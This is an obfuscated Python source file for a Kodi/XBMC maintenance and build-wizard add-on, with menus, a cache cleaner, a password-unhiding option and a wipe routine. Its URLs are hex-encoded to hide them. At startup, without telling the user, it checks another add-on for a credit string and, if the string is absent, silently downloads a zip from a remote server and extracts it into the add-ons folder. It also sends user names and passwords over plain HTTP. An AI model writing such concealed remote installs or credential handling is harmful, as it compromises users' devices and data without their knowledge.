 o0oO ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'tutorials' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime]All Guides[/COLOR] Everything in one place' , '' , 'grab_tutorials' , 'All.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime]XBMC / Kodi[/COLOR] Specific' , '' , 'xbmc_menu' , 'XBMC.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime]XBMC4Xbox[/COLOR] Specific' , '&platform=XBMC4Xbox' , 'xbmc_menu' , 'XBMC4Xbox.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] Android' , '&platform=Android' , 'platform_menu' , 'Android.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] Apple TV' , '&platform=ATV' , 'platform_menu' , 'ATV.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] ATV2 & iOS' , '&platform=iOS' , 'platform_menu' , 'iOS.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] Linux' , '&platform=Linux' , 'platform_menu' , 'Linux.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] Pure Linux' , '&platform=Custom_Linux' , 'platform_menu' , 'Custom_Linux.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] OpenELEC' , '&platform=OpenELEC' , 'platform_menu' , 'OpenELEC.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] OSMC' , '&platform=OSMC' , 'platform_menu' , 'OSMC.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] OSX' , '&platform=OSX' , 'platform_menu' , 'OSX.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] Raspbmc' , '&platform=Raspbmc' , 'platform_menu' , 'Raspbmc.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=orange][Platform][/COLOR] Windows' , '&platform=Windows' , 'platform_menu' , 'Windows.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Allwinner Devices' , '&hardware=Allwinner' , 'platform_menu' , 'Allwinner.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Amazon Fire TV' , '&hardware=AFTV' , 'platform_menu' , 'AFTV.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] AMLogic Devices' , '&hardware=AMLogic' , 'platform_menu' , 'AMLogic.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Boxee' , '&hardware=Boxee' , 'platform_menu' , 'Boxee.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Intel Devices' , '&hardware=Intel' , 'platform_menu' , 'Intel.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Raspberry Pi' , '&hardware=RaspberryPi' , 'platform_menu' , 'RaspberryPi.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Rockchip Devices' , '&hardware=Rockchip' , 'platform_menu' , 'Rockchip.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue][Hardware][/COLOR] Xbox' , '&hardware=Xbox' , 'platform_menu' , 'Xbox_Original.png' , '' , '' , '' )
 if 97 - 97: OOO00O / i1iiI11I % OOO00O / OoOo * iIIi1iIIi % OooOooo
def OOoOoo00Oo ( heading , anounce ) :
 class i1iiii1 ( ) :
  WINDOW = 10147
  CONTROL_LABEL = 1
  CONTROL_TEXTBOX = 5
  def __init__ ( self , * args , ** kwargs ) :
   xbmc . executebuiltin ( "ActivateWindow(%d)" % ( self . WINDOW , ) )
   self . win = xbmcgui . Window ( self . WINDOW )
   xbmc . sleep ( 500 )
   self . setControls ( )
  def setControls ( self ) :
   self . win . getControl ( self . CONTROL_LABEL ) . setLabel ( heading )
   try : Ii = open ( anounce ) ; oOO0000 = Ii . read ( )
   except : oOO0000 = anounce
   self . win . getControl ( self . CONTROL_TEXTBOX ) . setText ( str ( oOO0000 ) )
   return
 i1iiii1 ( )
 if 84 - 84: III1i1i % iIi1iIiii111 . iIi1iIiii111 . iIIi1iIIi * IIiII
 if 43 - 43: OooOooo . i1i1i11IIi % iiiIi1i1I
def OO0O00 ( ) :
 I1IiI = xbmcgui . Dialog ( )
 if I1IiI . yesno ( "Make Add-on Passwords Visible?" , "This will make all your add-on passwords visible." , "Are you sure you wish to continue?" ) :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( o0oO0 ) :
   for Ii in I1iii :
    if Ii == 'settings.xml' :
     i1Ii11ii1I = open ( os . path . join ( OooOo000OOOOo , Ii ) ) . read ( )
     ooo0O = re . compile ( '<setting id=(.+?)>' ) . findall ( i1Ii11ii1I )
     for OO0oI1iii1i in ooo0O :
      if 'pass' in OO0oI1iii1i :
       if 'option="hidden"' in OO0oI1iii1i :
        try :
         oO0ooOoOO = OO0oI1iii1i . replace ( ' option="hidden"' , '' )
         Ii = open ( os . path . join ( OooOo000OOOOo , Ii ) , mode = 'w' )
         Ii . write ( str ( i1Ii11ii1I ) . replace ( OO0oI1iii1i , oO0ooOoOO ) )
         Ii . close ( )
        except :
         pass
  I1IiI . ok ( "Passwords Are now visible" , "Your passwords will now be visible in your add-on settings." , "If you want to undo this please use the option to" , "hide passwords." )
  if 65 - 65: iiIi
  if 22 - 22: OO0O + II11iII + O000OO0
def oOo00Oo0o00oo ( ) :
 if ii . getSetting ( 'email' ) == '' :
  I1IiI = xbmcgui . Dialog ( )
  I1IiI . ok ( "No Email Address Set" , "A new window will Now open for you to enter your" , "Email address. The logfile will be sent here" )
  ii . openSettings ( )
 xbmc . executebuiltin ( 'XBMC.RunScript(special://home/addons/' + oo000 + '/uploadLog.py)' )
 if 58 - 58: OooOooo + I11iii1Ii * iIi1iIiii111
 if 31 - 31: o0OOOoO0 - iIIi1iIIi
def iIII11I ( localbuildcheck , localversioncheck , localidcheck ) :
 II1o0OoooOO00o = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f6c6f67696e2f6c6f67696e5f64657461696c732e7068703f757365723d257326706173733d2573'
 IIII = binascii . unhexlify ( II1o0OoooOO00o ) % ( o0OoOoOO00 , I11i )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 iIiIiiIIIi1 = re . compile ( 'login_msg="(.+?)"' ) . findall ( iiIiI )
 i1Ii1i111IIiIi1I = iIiIiiIIIi1 [ 0 ] if ( len ( iIiIiiIIIi1 ) > 0 ) else ''
 i11i1iIiii ( localbuildcheck , localversioncheck , localidcheck , i1Ii1i111IIiIi1I )
 if 89 - 89: III1i1i * IIiII * I11iii1Ii
def II11I ( ) :
 xbmc . executebuiltin ( 'UpdateLocalAddons' )
 xbmc . executebuiltin ( 'UpdateAddonRepos' )
 xbmcgui . Dialog ( ) . ok ( 'Force Refresh Started Successfully' , 'Depending on the speed of your device it could take a few minutes for the update to take effect.' , '' , '[COLOR=blue]For all your XBMC/Kodi support visit[/COLOR] [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
 return
 if 12 - 12: OoOo / O00oo0OO0oOOO
 if 86 - 86: O000OO0 % OooOooo
def o0o0O00oOo ( ) :
 if 42 - 42: II11iII
 if 60 - 60: iiiIi1i1I / OoOo . II11iII . iIIi1iIIi % o0OOOoO0 - OoOo
 if 39 - 39: OoOo . I11iii1Ii + IIiII + OO0O / II11iII % oO00OO0oo0
 if 86 - 86: i1i1i11IIi - iiiIi1i1I + O000OO0 * OoOo / oO00OO0oo0 % o0OOOoO0
 if 17 - 17: OOO00O + OOO00O . i1i1i11IIi
 if 50 - 50: i1iiI11I * o0OOOoO0
 if 85 - 85: iiiIi1i1I
 if 100 - 100: iiIi / IIiII % I11iii1Ii + iIi1iIiii111
 if 42 - 42: O000OO0 / O0OoO . iIi1iIiii111 * OoOo
 if 54 - 54: OooOooo * iIIi1iIIi + I11iii1Ii
 if 93 - 93: O00oo0OO0oOOO / OoOo
 if 47 - 47: O000OO0 * OO0O
 if 98 - 98: o0OOOoO0 - o0OOOoO0 . OOO00O
 if 60 - 60: OoOo * i1i1i11IIi / III1i1i + IIiII + O0OoO
 if 66 - 66: O0OoO * O000OO0 . iiIi * OO
 if 93 - 93: O0OoO / iiiIi1i1I
 if 47 - 47: OOO00O - iIi1iIiii111
 if not os . path . exists ( II ) :
  os . makedirs ( II )
 if not os . path . exists ( i1iIIi1 ) :
  oOooO00o0O = open ( i1iIIi1 , mode = 'w+' )
  oOooO00o0O . write ( 'date="01011001"\nversion="0.0"' )
  oOooO00o0O . close ( )
 if not os . path . exists ( iI111I11I1I1 ) :
  oOooO00o0O = open ( iI111I11I1I1 , mode = 'w+' )
  oOooO00o0O . write ( 'id="None"\nname="None"' )
  oOooO00o0O . close ( )
 OOoo0oo000 = 1
 oo0o0OO = xbmc . getInfoLabel ( 'Network.IPAddress' )
 try :
  o00oooO0Oo ( 'http://google.com' )
 except :
  OOoo0oo000 = 0
 if oo0o0OO == '' or OOoo0oo000 == 0 :
  I1IiI . ok ( "NO INTERNET CONNECTION" , 'It looks like this device isn\'t connected to the internet.' , 'Only some of the maintenance options will work' , 'until you fix the connectivity problem.' )
  i11i1iIiii ( '' , '' , '' , '[COLOR=orange]NO INTERNET CONNECTION[/COLOR]' )
 else :
  if oo000 == binascii . unhexlify ( '706c7567696e2e70726f6772616d2e746273' ) :
   iiI11I1III = '68747470733a2f2f746f74616c626f7873686f702e74762f5442532f5442535f436865636b2e747874'
  if oo000 == binascii . unhexlify ( '706c7567696e2e70726f6772616d2e746f74616c696e7374616c6c6572' ) :
   iiI11I1III = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f636865636b2e747874'
  i11iii1iiIi1IiiiI = binascii . unhexlify ( iiI11I1III )
  Oo0 = xbmc . translatePath ( os . path . join ( o0oO0 , oo000 , 'addon.xml' ) )
  OO0oooOO = binascii . unhexlify ( '706c7567696e2e766964656f2e6368726973627072656d69756d' )
  IIIi1iiIIiiiI = xbmc . translatePath ( os . path . join ( o0oO0 , OO0oooOO , 'addon.xml' ) )
  I1IIiIi1iI = '68747470733a2f2f69613630313530382e75732e617263686976652e6f72672f362f6974656d732f706c7567696e2e70726f6772616d2e63626669782f706c7567696e2e766964656f2e63626669782e7a6970'
  oOo0 = open ( Oo0 , mode = 'r' )
  OOo0 = file . read ( oOo0 )
  file . close ( oOo0 )
  Iiii11 = '5468616e6b7320746f2077687566636c656520666f7220746865206f726967696e616c20436f6d6d756e697479204275696c647320636f6465207573656420696e2074686973206164642d6f6e'
  o00000O = re . compile ( 'check="1" version="(.+?)"' ) . findall ( OOo0 )
  iIiiiII11 = o00000O [ 0 ] if ( len ( o00000O ) > 0 ) else '1.0'
  iiIiI = o00oooO0Oo ( i11iii1iiIi1IiiiI ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  ooo00Oo0 = re . compile ( 'version="(.+?)"' ) . findall ( iiIiI )
  iIii1i1Ii = re . compile ( 'url="(.+?)"' ) . findall ( iiIiI )
  III1iIii = ooo00Oo0 [ 0 ] if ( len ( ooo00Oo0 ) > 0 ) else '1.0'
  iiIII1i1 = iIii1i1Ii [ 0 ] if ( len ( iIii1i1Ii ) > 0 ) else ''
  if III1iIii > iIiiiII11 and oo000 == 'plugin.program.tbs' :
   Oo0 = xbmc . translatePath ( os . path . join ( o0oO0 , oo000 , 'addon.xml' ) )
   oOo0 = open ( Oo0 , mode = 'r' )
   OOo0 = file . read ( oOo0 )
   file . close ( oOo0 )
   o00000O = re . compile ( 'check="1" version="(.+?)"' ) . findall ( OOo0 )
   iIiiiII11 = o00000O [ 0 ] if ( len ( o00000O ) > 0 ) else '1.0'
   oOOo0OOoOO0 = re . compile ( 'tbs" name="(.+?)"' ) . findall ( OOo0 )
   IiIi = oOOo0OOoOO0 [ 0 ] if ( len ( oOOo0OOoOO0 ) > 0 ) else 'Untitled'
   IIi1IiiIi1III = re . compile ( '<summary lang="en">(.+?)"' ) . findall ( OOo0 )
   IiIiIiiIIii = IIi1IiiIi1III [ 0 ] if ( len ( IIi1IiiIi1III ) > 0 ) else 'The ultimate wizard'
   OOo00O00o0O0 = re . compile ( '<description>(.+?)</' ) . findall ( OOo0 )
   iI1III = OOo00O00o0O0 [ 0 ] if ( len ( OOo00O00o0O0 ) > 0 ) else 'The ultimate Kodi wizard!'
   time . sleep ( 1 )
   I1I111 = xbmc . translatePath ( os . path . join ( o0oO0 , oo000 , 'resources/settings.xml' ) )
   I1iI = open ( I1I111 , mode = 'r' )
   I1i11II11i1iI = file . read ( I1iI )
   file . close ( I1iI )
   IIiiIooO0 = re . compile ( 'id="openelec" type="bool"(.+?)<setting id="reseller"' ) . findall ( I1i11II11i1iI )
   print "Downloading newer version"
   o0OOO . create ( "Installing new version" , "Downloading " , '' , 'Please Wait' )
   downloader . download ( iiIII1i1 , Ooo + '/' + oo000 + '.zip' , o0OOO )
   o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
   I1iii11 ( Ooo + '/' + oo000 + '.zip' , o0oO0 , o0OOO )
   time . sleep ( 1 )
   if 47 - 47: OO0O . OO % II11iII + O000OO0 - o0OOOoO0 . II11iII
   iIIiiIIIi1I = open ( Oo0 ) . read ( )
   ooooO0O = iIIiiIIIi1I . replace ( 'YOUR_ADDON_NAME_HERE' , IiIi ) . replace ( 'ADD_DESCRIPTION_HERE' , iI1III ) . replace ( 'ADD_SUMMARY_HERE' , IiIiIiiIIii )
   Ii = open ( Oo0 , mode = 'w' )
   Ii . write ( str ( ooooO0O ) )
   Ii . close ( )
   if 37 - 37: i1iiI11I . OoOo % I11iii1Ii % iiIi . iiIi / III1i1i
   IiIii1i11i1 = open ( I1I111 , mode = 'r' )
   ooOOo00o0ooO = file . read ( IiIii1i11i1 )
   file . close ( IiIii1i11i1 )
   iIOO = re . compile ( 'id="openelec" type="bool"(.+?)<setting id="reseller"' ) . findall ( ooOOo00o0ooO )
   ooooO0O = iIIiiIIIi1I . replace ( iIOO , IIiiIooO0 )
   Ii = open ( I1I111 , mode = 'w' )
   Ii . write ( str ( ooooO0O ) )
   Ii . close ( )
   xbmc . executebuiltin ( 'UpdateLocalAddons' )
   xbmc . executebuiltin ( 'UpdateAddonRepos' )
  if os . path . exists ( IIIi1iiIIiiiI ) :
   I1III1I11I1 = open ( IIIi1iiIIiiiI , mode = 'r' )
   OOo0 = file . read ( I1III1I11I1 )
   file . close ( I1III1I11I1 )
   oO000OoO00OoO = binascii . unhexlify ( Iiii11 )
   I1IiIi1iiI = binascii . unhexlify ( I1IIiIi1iI )
   if not oO000OoO00OoO in OOo0 :
    downloader . download ( I1IiIi1iiI , Ooo + '/plugin.program.cbfix.zip' )
    I1iii11 ( Ooo + '/plugin.program.cbfix.zip' , o0oO0 )
  iiII1II11i = ii . getSetting ( 'startupvideo' )
  if I1ii11iIi11i == 'true' :
   ooO0 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f756e6c6f636b65642e747874'
   IIII = binascii . unhexlify ( ooO0 )
  else :
   OoooooOo0oOo0 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f76616e696c6c612e747874'
   IIII = binascii . unhexlify ( OoooooOo0oOo0 )
  iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  II11II = re . compile ( 'date="(.+?)"' ) . findall ( iiIiI )
  i1ii11 = re . compile ( 'video="https://www.youtube.com/watch\?v=(.+?)"' ) . findall ( iiIiI )
  iIiO0O = II11II [ 0 ] if ( len ( II11II ) > 0 ) else ''
  IIIo00O = i1ii11 [ 0 ] if ( len ( i1ii11 ) > 0 ) else ''
  if 26 - 26: OooOooo
  oOooO00o0O = open ( i1iIIi1 , mode = 'r' )
  OOo0 = file . read ( oOooO00o0O )
  file . close ( oOooO00o0O )
  I1I11I = re . compile ( 'date="(.+?)"' ) . findall ( OOo0 )
  ooOOO0oOoooOo = I1I11I [ 0 ] if ( len ( I1I11I ) > 0 ) else ''
  OOooOooo0OOo0 = re . compile ( 'version="(.+?)"' ) . findall ( OOo0 )
  oo0o0OoOO0o0 = OOooOooo0OOo0 [ 0 ] if ( len ( OOooOooo0OOo0 ) > 0 ) else ''
  O00oO0o000oO = open ( iI111I11I1I1 , mode = 'r' )
  I1i11II11i1iI = file . read ( O00oO0o000oO )
  file . close ( O00oO0o000oO )
  Ii11IIIii11 = re . compile ( 'id="(.+?)"' ) . findall ( I1i11II11i1iI )
  O0ooi1ii1i1i1 = Ii11IIIii11 [ 0 ] if ( len ( Ii11IIIii11 ) > 0 ) else 'None'
  iiIii1IIi = re . compile ( 'name="(.+?)"' ) . findall ( I1i11II11i1iI )
  ii1IiIiI1 = iiIii1IIi [ 0 ] if ( len ( iiIii1IIi ) > 0 ) else ''
  if int ( ooOOO0oOoooOo ) < int ( iIiO0O ) and iiII1II11i == 'true' :
   I1ii1i11i = OOo0 . replace ( ooOOO0oOoooOo , iIiO0O )
   O0o0oo0oOO0oO = open ( i1iIIi1 , mode = 'w' )
   O0o0oo0oOO0oO . write ( str ( I1ii1i11i ) )
   O0o0oo0oOO0oO . close ( )
   yt . PlayVideo ( IIIo00O , forcePlayer = True )
   xbmc . sleep ( 500 )
   while xbmc . Player ( ) . isPlaying ( ) :
    xbmc . sleep ( 500 )
  iIII11I ( ii1IiIiI1 , oo0o0OoOO0o0 , O0ooi1ii1i1i1 )
  if 92 - 92: O000OO0
  if 60 - 60: oO00OO0oo0 . III1i1i * i1iiI11I * OooOooo
def IIi1I ( ) :
 OoOOoO0o = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'cache' )
 if os . path . exists ( OoOOoO0o ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( OoOOoO0o ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     try :
      os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
     except :
      pass
    for i1Ii11II in O0oooo00o0Oo :
     try :
      shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     except :
      pass
 o0O00ooo0 = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'temp' )
 if os . path . exists ( o0O00ooo0 ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( o0O00ooo0 ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     try :
      os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
     except :
      pass
    for i1Ii11II in O0oooo00o0Oo :
     try :
      shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     except :
      pass
 if xbmc . getCondVisibility ( 'system.platform.ATV2' ) :
  iI1iIi1 = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( iI1iIi1 ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
  O00oOOO0 = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' )
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( O00oOOO0 ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 4 - 4: oO00OO0oo0 + iiIi / oO00OO0oo0 . iiIi % i1i1i11IIi / OooOooo
 IIIiIIii11I = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 if os . path . exists ( IIIiIIii11I ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( IIIiIIii11I ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 90 - 90: OooOooo % O00oo0OO0oOOO
 OOoOO0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.image.music.slideshow/cache' ) , '' )
 if os . path . exists ( OOoOO0 ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( OOoOO0 ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 13 - 13: i1iiI11I + i1i1i11IIi
 II1i1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 if os . path . exists ( II1i1 ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( II1i1 ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 51 - 51: OOO00O * iIIi1iIIi / iiiIi1i1I
 IIi1I1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 if os . path . exists ( IIi1I1 ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( IIi1I1 ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 37 - 37: O00oo0OO0oOOO * O000OO0
 iI11i1I1i = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.navi-x/cache' ) , '' )
 if os . path . exists ( iI11i1I1i ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( iI11i1I1i ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 96 - 96: OO / O0OoO * i1iiI11I + oO00OO0oo0 * i1i1i11IIi / OoOo
 OoOo0000o0OOo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 if os . path . exists ( OoOo0000o0OOo ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( OoOo0000o0OOo ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 84 - 84: OOO00O
 I11i1iiiiIIIi = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.audio.ramfm/cache' ) , '' )
 if os . path . exists ( I11i1iiiiIIIi ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( I11i1iiiiIIIi ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 13 - 13: III1i1i + OO * II11iII + O000OO0 * O0OoO
 i1111ii1I = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 if os . path . exists ( i1111ii1I ) == True :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( i1111ii1I ) :
   iiIii1I1Iii = 0
   iiIii1I1Iii += len ( I1iii )
   if iiIii1I1Iii > 0 :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
     if 60 - 60: OO0O * OOO00O * I11iii1Ii
 try :
  O0ooO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
  OOo0OOOoOOo = database . connect ( O0ooO )
  III = OOo0OOOoOOo . cursor ( )
  III . execute ( "DROP TABLE IF EXISTS rel_list" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
  III . execute ( "DROP TABLE IF EXISTS rel_lib" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
 except :
  pass
  if 42 - 42: III1i1i * iIIi1iIIi . OooOooo / OO0O - iIi1iIiii111 . IIiII
  if 57 - 57: O00oo0OO0oOOO + O000OO0 * i1i1i11IIi - OOO00O % i1iiI11I - iIi1iIiii111
def I11iIiI1 ( mode ) :
 if zip == '' :
  I1IiI . ok ( 'Please set your backup location before proceeding' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' , '' , '' )
  ii . openSettings ( sys . argv [ 0 ] )
  III1I11II11I = ii . getSetting ( 'zip' )
  if III1I11II11I == '' :
   I11iIiI1 ( mode )
 oooO0 = xbmc . translatePath ( os . path . join ( i1iiIIiiI111 , 'Community Builds' , 'My Builds' ) )
 if not os . path . exists ( oooO0 ) :
  os . makedirs ( oooO0 )
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( "ABSOLUTELY CERTAIN?!!!" , 'Are you absolutely certain you want to wipe?' , '' , 'All addons and settings will be completely wiped!' , yeslabel = 'Yes' , nolabel = 'No' )
 if 78 - 78: i1i1i11IIi . OO . OO . IIiII % iIIi1iIIi
 if OO0OO0OO == 1 :
  if oOOoO0 != "skin.confluence" :
   I1IiI . ok ( '[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]' , 'Please switch to the default Confluence skin' , 'before performing a wipe.' , '' )
   xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
   return
  else :
   if 26 - 26: OOO00O + I11iii1Ii / OooOooo . II11iII * iIi1iIiii111
   OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( "VERY IMPORTANT" , 'This will completely wipe your install.' , 'Would you like to create a backup before proceeding?' , '' , yeslabel = 'No' , nolabel = 'Yes' )
   if OO0OO0OO == 0 :
    if not os . path . exists ( oooO0 ) :
     os . makedirs ( oooO0 )
    ii1i1i = II11iIII1i1I ( heading = "Enter a name for this backup" )
    if ( not ii1i1i ) : return False , 0
    oOO0oo = urllib . quote_plus ( ii1i1i )
    IiIIi1I1I11Ii = xbmc . translatePath ( os . path . join ( oooO0 , oOO0oo + '.zip' ) )
    o0OO = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
    OoiiIiI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
    ooOo = "Creating full backup of existing build"
    oOOOOOoOO = "Archiving..."
    oooo00 = ""
    i1oO = "Please Wait"
    i1i1IIii1i1 ( iIiiiI , IiIIi1I1I11Ii , ooOo , oOOOOOoOO , oooo00 , i1oO , o0OO , OoiiIiI )
    if 21 - 21: OoOo - OoOo + iIIi1iIIi % OoOo * o0OOOoO0
    if 74 - 74: iIIi1iIIi / IIiII . OoOo - iiIi + II11iII + IIiII
   o0OOO . create ( "Wiping Existing Content" , '' , 'Please wait...' , '' )
   for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( iIiiiI , topdown = True ) :
    O0oooo00o0Oo [ : ] = [ i1Ii11II for i1Ii11II in O0oooo00o0Oo if i1Ii11II not in O0o0Oo ]
    for i1II1 in I1iii :
     try :
      o0OOO . update ( 0 , "Removing [COLOR=yellow]" + i1II1 + '[/COLOR]' , '' , 'Please wait...' )
      os . unlink ( os . path . join ( OooOo000OOOOo , i1II1 ) )
      os . remove ( os . path . join ( OooOo000OOOOo , i1II1 ) )
      os . rmdir ( os . path . join ( OooOo000OOOOo , i1II1 ) )
     except : print "Failed to remove file: " + i1II1
